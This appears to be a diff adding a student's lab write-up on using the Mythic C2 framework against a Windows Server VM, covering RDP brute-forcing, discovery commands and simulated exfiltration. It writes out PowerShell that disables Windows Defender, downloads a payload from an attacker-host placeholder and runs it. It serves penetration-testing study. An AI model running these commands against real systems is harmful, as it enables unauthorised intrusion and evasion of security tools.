@@ -1,0 +1,95 @@
+# 🧠 Mythic Agent Setup Tutorial | Day 21
+
+## 🎯 Objective
+Learn how to perform an **RDP brute-force attack**, generate and deploy a **Mythic agent**, and establish a successful **Command and Control (C2)** connection.
+
+
+
+## 🧪 Lab Environment
+- **Attacker Machine**: Parrot OS VM
+- **Target Machine**: Windows Server VM
+- **C2 Framework**: Mythic C2
+- **Agent Used**: Apollo
+- **C2 Profile**: HTTP
+
+
+
+## 🛠️ Steps Performed
+
+### 1. Brute-Force via RDP
+- Used my Parrot OS VM to brute-force RDP credentials of the Windows Server VM.
+- Successfully gained access.
+
+### 2. Post-Exploitation Discovery
+On the compromised Windows Server:
+```powershell
+whoami
+ipconfig
+net user
+net user Administrator
+````
+
+### 3. Defense Evasion
+
+* Disabled Windows Defender to avoid detection of our payload:
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### 4. Payload Generation via Mythic
+
+* Installed the **Apollo** agent in Mythic.
+* Selected the **HTTP** C2 profile.
+* Built a payload specifically for the Windows Server target.
+
+### 5. Payload Delivery
+
+* Started a Python HTTP server on Mythic VM:
+
+```bash
+python3 -m http.server 80
+```
+
+* On the Windows VM, downloaded the payload using PowerShell:
+
+```powershell
+Invoke-WebRequest -Uri http://<mythic-vm-ip>/payload.exe -OutFile C:\Users\Public\payload.exe
+```
+
+### 6. Agent Execution
+
+* Executed the payload and successfully established a session in Mythic:
+
+```powershell
+Start-Process "C:\Users\Public\payload.exe"
+```
+
+### 7. Remote Execution for Data Exfiltration
+
+* Remotely executed commands to simulate data exfiltration:
+
+```powershell
+Get-Content C:\Users\Public\passwords.txt
+```
+
+> Note: `passwords.txt` was a dummy file created for demo purposes.
+
+
+
+## 🔐 Key Learnings
+
+* Hands-on C2 setup and management with Mythic
+* RDP brute-force simulation
+* Payload generation and delivery
+* Remote command execution and data exfiltration
+* Defense evasion techniques
+
+
+
+## 📌 Important Notes
+
+⚠️ This tutorial was conducted in a **controlled lab environment** for educational purposes only.
+Performing unauthorized access or attacks on real systems is **illegal** and against ethical hacking principles.
+
+
